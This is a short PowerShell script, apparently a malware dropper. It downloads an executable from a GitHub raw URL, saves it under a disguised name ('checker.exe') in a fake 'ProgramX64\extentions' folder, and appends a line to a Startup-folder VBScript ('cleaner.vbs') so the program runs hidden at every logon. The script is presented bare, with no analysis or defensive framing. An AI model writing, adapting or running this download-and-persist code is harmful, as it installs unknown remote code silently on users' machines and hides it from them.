
$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/waj.exe"
$destination = "C:\ProgramX64\extentions\checker.exe"

$directory = Split-Path -Path $destination
if (-not (Test-Path -Path $directory)) {
    New-Item -ItemType Directory -Path $directory -Force | Out-Null
    
}

# Download the file

Invoke-WebRequest -Uri $url -OutFile $destination

$vbsPath = "C:\users\onsbt\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cleaner.vbs"

# The VBScript line to append
$vbsLine = 'WshShell.Run """C:\ProgramX64\extentions\checker.exe""", 0, False'

# Append the line to the file
Add-Content -Path $vbsPath -Value $vbsLine
